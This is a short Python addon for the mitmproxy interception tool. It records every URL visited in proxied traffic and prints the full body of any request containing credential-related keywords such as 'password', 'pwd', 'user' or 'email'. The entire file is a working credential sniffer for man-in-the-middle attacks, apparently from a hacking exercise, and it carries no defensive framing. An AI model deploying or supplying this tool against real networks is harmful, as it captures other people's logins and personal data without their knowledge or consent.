#!/usr/bin/env python3 
from mitmproxy import http
from urllib.parse import urlparse
#from termcolor import colored


urls_visiteds = set()
sensible_words = ["login", "user", "pass", "username", "password", "admin", "name", "uname", "pwd", "email", "mail", "correo", "urname"]

def is_sensible(data):
    return any(word in data for word in sensible_words)


def request(packet):
    url = packet.request.url
    url = urlparse(url)
    protocol = url.scheme
    domain = url.netloc
    path = url.path
    data = packet.request.get_text()


    url_to_show = f"{protocol}://{domain}{path}"

    if url_to_show not in urls_visiteds:
        urls_visiteds.add(url_to_show)
        print(f"\n[+] URL Visited: {url_to_show}\n")

    if is_sensible(data):
        print("\n\n\t[!] Possible sensible data:\n")
        print(data)


